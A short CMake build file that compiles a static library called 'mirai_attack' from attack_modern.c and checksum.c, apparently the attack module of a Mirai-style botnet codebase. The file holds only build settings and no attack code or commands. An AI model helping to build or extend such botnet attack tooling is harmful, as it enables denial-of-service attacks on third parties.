# Attack module CMakeLists.txt

add_library(mirai_attack STATIC
    attack_modern.c
    checksum.c
)

target_include_directories(mirai_attack PUBLIC
    ${CMAKE_CURRENT_SOURCE_DIR}
    ${CMAKE_SOURCE_DIR}/src/common
)

target_link_libraries(mirai_attack
    mirai_common
    pthread
)

target_compile_options(mirai_attack PRIVATE
    -Wall -Wextra -Wpedantic -Werror
)
